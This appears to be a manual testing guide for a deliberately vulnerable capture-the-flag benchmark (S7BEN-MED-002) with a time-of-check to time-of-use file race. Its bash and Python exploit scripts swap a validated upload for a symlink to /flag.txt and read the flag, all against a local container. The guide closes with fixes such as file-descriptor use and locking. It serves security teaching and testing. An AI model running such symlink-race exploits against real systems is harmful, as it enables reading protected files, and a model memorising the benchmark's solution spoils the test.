# S7BEN-MED-002: Manual Testing Guide

## Vulnerability: TOCTOU - File Operation Race Condition

### Overview
This benchmark demonstrates a Time-of-Check to Time-of-Use (TOCTOU) race condition in file processing where files can be replaced or symlinked between validation and processing phases.

**Key Difference from Phase 1:** This benchmark features a realistic 200ms race window (not artificially long) and dynamic flag generation based on successfully exfiltrated file content.

---

## Setup

### 1. Build and Start the Benchmark
```bash
cd benchmarks/S7BEN-MED-002
make build
make up
```

### 2. Verify Service is Running
```bash
make test
# Should output: Health check passed
```

### 3. Access the Application
Open your browser to: http://localhost:5000

---

## Understanding TOCTOU

### What is Time-of-Check to Time-of-Use?

TOCTOU is a class of race condition where:
1. **Time of Check (TOC)**: System validates a resource's state
2. **Race Window**: Attacker modifies the resource
3. **Time of Use (TOU)**: System uses the resource (now different!)

### The Vulnerability Flow:

```
Time  Operation                  File State              Attacker Action
----  -------------------------  ----------------------  ------------------
t0    Upload file.txt            file.txt (benign)
t1    Validate file.txt          ✅ Validation passes
t2    Sleep 200ms (race window)  file.txt (benign)       → Replace with symlink!
t3                               symlink → /flag.txt
t4    Read file                  /flag.txt (sensitive!)
t5    Return content + FLAG      💥 Exploitation!
```

### Race Window Details:

- **Duration**: 200ms (realistic I/O latency simulation)
- **Attack Vector 1**: Replace file with symlink
- **Attack Vector 2**: Overwrite file content
- **Detection**: Real path differs from expected path

---

## Manual Testing Steps

### Step 1: Upload a Valid File

```bash
# Create a test file
echo "This is a benign test file" > /tmp/test.txt

# Upload it
UPLOAD_RESPONSE=$(curl -s -X POST http://localhost:5000/upload \
  -F "file=@/tmp/test.txt")

echo "$UPLOAD_RESPONSE"

# Extract file_id
FILE_ID=$(echo "$UPLOAD_RESPONSE" | grep -o '"file_id":"[^"]*"' | cut -d'"' -f4)
echo "File ID: $FILE_ID"
```

**Expected Output:**
```json
{
  "status": "success",
  "message": "File uploaded successfully",
  "file_id": "abc123...",
  "filename": "test.txt"
}
```

### Step 2: Validate the File (TIME OF CHECK)

```bash
VALIDATION_RESPONSE=$(curl -s -X POST "http://localhost:5000/validate/$FILE_ID")
echo "$VALIDATION_RESPONSE"

# Extract validation token
VALIDATION_TOKEN=$(echo "$VALIDATION_RESPONSE" | grep -o '"validation_token":"[^"]*"' | cut -d'"' -f4)
echo "Validation Token: $VALIDATION_TOKEN"
```

**Expected Output:**
```json
{
  "status": "validation_passed",
  "message": "Validation passed",
  "file_id": "abc123...",
  "validation_token": "def456..."
}
```

### Step 3: Normal Processing (No Exploit)

To understand normal behavior first:

```bash
# Process the file normally (without replacement)
PROCESS_RESPONSE=$(curl -s -X POST "http://localhost:5000/process/$FILE_ID" \
  -H "Content-Type: application/json" \
  -d "{\"validation_token\": \"$VALIDATION_TOKEN\"}")

echo "$PROCESS_RESPONSE"
```

**Expected Output (Normal):**
```json
{
  "status": "success",
  "file_id": "abc123...",
  "content_preview": "This is a benign test file",
  "content_length": 28,
  "content_hash": "sha256_hash...",
  "exploitation_detected": false
}
```

---

## Exploitation Methods

### Method 1: Symlink Attack (Shell Script)

This exploits the race window by replacing the validated file with a symlink to `/flag.txt`.

Create `exploit_symlink.sh`:

```bash
#!/bin/bash

URL="http://localhost:5000"

echo "============================================================"
echo "S7BEN-MED-002: TOCTOU Symlink Exploit"
echo "============================================================"

# Step 1: Upload valid file
echo ""
echo "[*] Step 1: Uploading valid file..."
echo "Benign content" > /tmp/benign.txt

UPLOAD=$(curl -s -X POST $URL/upload -F "file=@/tmp/benign.txt")
FILE_ID=$(echo "$UPLOAD" | grep -o '"file_id":"[^"]*"' | cut -d'"' -f4)

if [ -z "$FILE_ID" ]; then
    echo "[-] Upload failed"
    exit 1
fi

echo "[+] File uploaded: $FILE_ID"

# Step 2: Validate file
echo ""
echo "[*] Step 2: Validating file (TIME OF CHECK)..."

VALIDATION=$(curl -s -X POST "$URL/validate/$FILE_ID")
VALIDATION_TOKEN=$(echo "$VALIDATION" | grep -o '"validation_token":"[^"]*"' | cut -d'"' -f4)

if [ -z "$VALIDATION_TOKEN" ]; then
    echo "[-] Validation failed"
    echo "$VALIDATION"
    exit 1
fi

echo "[+] Validation passed, token: ${VALIDATION_TOKEN:0:20}..."

# Step 3: Get upload directory from API
echo ""
echo "[*] Step 3: Finding file location..."

FILE_STATUS=$(curl -s "$URL/api/status/$FILE_ID")
FILE_PATH=$(echo "$FILE_STATUS" | grep -o '"stored_path":"[^"]*"' | cut -d'"' -f4)

echo "[+] File path: $FILE_PATH"

# Step 4: Replace file with symlink (requires docker exec)
echo ""
echo "[*] Step 4: Exploiting race window..."
echo "[!] This requires replacing the file inside the container"
echo ""
echo "Run in another terminal:"
echo "=================================="
echo "docker exec -it \$(docker ps -qf 'name=sben-400-03') sh -c \\"
echo "  'rm $FILE_PATH && ln -s /flag.txt $FILE_PATH'"
echo "=================================="
echo ""
read -p "Press Enter after replacing file with symlink..."

# Step 5: Process file (TIME OF USE)
echo ""
echo "[*] Step 5: Processing file (TIME OF USE)..."

PROCESS=$(curl -s -X POST "$URL/process/$FILE_ID" \
  -H "Content-Type: application/json" \
  -d "{\"validation_token\": \"$VALIDATION_TOKEN\"}")

echo "$PROCESS"

# Check for flag
if echo "$PROCESS" | grep -q "S7BEN{"; then
    echo ""
    echo "============================================================"
    echo "✅ EXPLOITATION SUCCESSFUL!"
    echo "============================================================"
    FLAG=$(echo "$PROCESS" | grep -o 'S7BEN{[^"]*}')
    echo "Flag: $FLAG"
    echo "============================================================"
else
    echo ""
    echo "[-] Exploitation failed - no flag found"
fi
```

### Method 2: Python Multi-threaded Race

This method uses threading to win the race condition automatically:

Create `exploit.py`:

```python
import requests
import threading
import time
import os

URL = "http://localhost:5000"
CONTAINER_NAME = "sben-400-03-app-1"  # Adjust if needed

def exploit_toctou():
    print("="*60)
    print("S7BEN-MED-002: TOCTOU File Race Exploit")
    print("="*60)

    # Step 1: Create and upload benign file
    print("\n[*] Step 1: Uploading benign file...")

    files = {'file': ('test.txt', b'Benign content', 'text/plain')}
    upload_response = requests.post(f"{URL}/upload", files=files)
    upload_data = upload_response.json()

    if upload_data['status'] != 'success':
        print(f"[-] Upload failed: {upload_data}")
        return False

    file_id = upload_data['file_id']
    print(f"[+] File uploaded: {file_id}")

    # Step 2: Validate file
    print("\n[*] Step 2: Validating file (TIME OF CHECK)...")

    validate_response = requests.post(f"{URL}/validate/{file_id}")
    validate_data = validate_response.json()

    if validate_data['status'] != 'validation_passed':
        print(f"[-] Validation failed: {validate_data}")
        return False

    validation_token = validate_data['validation_token']
    print(f"[+] Validation passed")

    # Step 3: Get file path
    print("\n[*] Step 3: Getting file location...")

    status_response = requests.get(f"{URL}/api/status/{file_id}")
    status_data = status_response.json()
    file_path = status_data['stored_path']

    print(f"[+] File path: {file_path}")

    # Step 4: Replace file with symlink (race condition)
    print("\n[*] Step 4: Attempting race condition exploit...")
    print("[!] This requires docker exec to replace the file")

    # Function to replace file
    def replace_with_symlink():
        time.sleep(0.05)  # Small delay to ensure validation completed
        cmd = f"docker exec {CONTAINER_NAME} sh -c 'rm {file_path} && ln -s /flag.txt {file_path}'"
        os.system(cmd)
        print("[+] File replaced with symlink")

    # Function to process file
    def process_file():
        time.sleep(0.1)  # Delay to let replacement happen
        return requests.post(
            f"{URL}/process/{file_id}",
            json={"validation_token": validation_token}
        )

    # Start both operations
    replace_thread = threading.Thread(target=replace_with_symlink)
    replace_thread.start()

    process_response = process_file()
    replace_thread.join()

    # Step 5: Check result
    print("\n[*] Step 5: Checking exploitation result...")

    process_data = process_response.json()

    if process_data.get('exploitation_detected'):
        print("\n" + "="*60)
        print("✅ EXPLOITATION SUCCESSFUL!")
        print("="*60)
        print(f"\nFlag: {process_data['flag']}")
        print(f"\nProof:")
        print(f"  - Content Hash: {process_data['content_hash']}")
        print(f"  - Content Length: {process_data['content_length']}")
        print(f"  - Real Path: {process_data['real_path']}")
        print(f"  - Message: {process_data['message']}")
        print("\n" + "="*60)
        return True
    else:
        print(f"\n[-] Exploitation failed")
        print(f"Response: {process_data}")
        return False

if __name__ == "__main__":
    success = exploit_toctou()
    exit(0 if success else 1)
```

### Method 3: Manual Browser + Docker Exec

**Step-by-Step in Browser:**

1. **Upload File:**
   - Open http://localhost:5000
   - Select a small .txt file
   - Click "Upload File"
   - Note the File ID

2. **Validate File:**
   - Enter the File ID
   - Click "1. Validate"
   - See validation pass

3. **Replace File (in terminal):**
   ```bash
   # Get container ID
   CONTAINER=$(docker ps -qf 'name=sben-400-03')

   # Get file ID from browser (e.g., abc123...)
   FILE_ID="paste_file_id_here"

   # Replace file with symlink
   docker exec $CONTAINER sh -c "
   FILE_PATH=\$(find /app/uploads/$FILE_ID -name '*.txt')
   rm \$FILE_PATH
   ln -s /flag.txt \$FILE_PATH
   "
   ```

4. **Process File:**
   - Click "2. Process"
   - See flag appear!

---

## Understanding the Dynamic Flag

The flag is generated dynamically based on the exfiltrated content:

```python
def generate_flag(content_hash, content_length):
    data = f"toctou:{content_hash}:{content_length}:{int(time.time())}"
    flag_hash = hmac.new(
        FLAG_SECRET.encode(),
        data.encode(),
        hashlib.sha256
    ).hexdigest()[:32]

    return f"S7BEN{{toctou_file_race_{flag_hash}}}"
```

This proves:
- **File was actually read** (content hash matches /flag.txt)
- **TOCTOU occurred** (real path ≠ expected path)
- **Cannot be guessed** (requires FLAG_SECRET)

---

## Troubleshooting

### Issue: Race condition not working

**Cause:** Timing is tight (200ms window).

**Solutions:**
1. Use the Python multi-threaded exploit
2. Increase attempts (race conditions are probabilistic)
3. Verify file replacement happened before processing

### Issue: Can't replace file

**Cause:** File permissions or path issues.

**Solution:**
```bash
# Check file exists
docker exec CONTAINER ls -la /app/uploads/FILE_ID/

# Check permissions
docker exec CONTAINER ls -l /flag.txt
```

### Issue: "File does not exist" after replacement

**Cause:** Symlink was created but processing happened too fast/slow.

**Solution:** Try multiple times - race conditions require precise timing.

---

## Prevention Techniques

### Proper Fix:

```python
def process_file_secure(filepath):
    # Open file descriptor BEFORE validation
    with open(filepath, 'r') as f:
        # Validate using file descriptor
        if not validate_fd(f):
            return error

        # NO DELAY - use same fd immediately
        content = f.read()

    # Or: Use file descriptor locks
    import fcntl
    fd = os.open(filepath, os.O_RDONLY)
    fcntl.flock(fd, fcntl.LOCK_EX)
    # ... validate and process ...
    fcntl.flock(fd, fcntl.LOCK_UN)
```

### Best Practices:

1. **Minimize race window** - validate and use atomically
2. **Use file descriptors** - not paths
3. **Implement file locking**
4. **Check file identity** - compare inode before/after
5. **Use secure temp directories** - with proper permissions

---

## Cleanup

```bash
make down
make clean
```

---

## Success Criteria

- ✅ Uploaded valid file successfully
- ✅ File passed validation (TIME OF CHECK)
- ✅ Replaced file with symlink to /flag.txt
- ✅ Processing read /flag.txt (TIME OF USE)
- ✅ Retrieved dynamically generated flag
- ✅ Flag format: `S7BEN{toctou_file_race_<32_hex_chars>}`

---

## Additional Resources

- **CWE-367:** https://cwe.mitre.org/data/definitions/367.html
- **OWASP TOCTOU:** https://owasp.org/www-community/vulnerabilities/Time_of_check_time_of_use
- **Race Conditions:** https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use
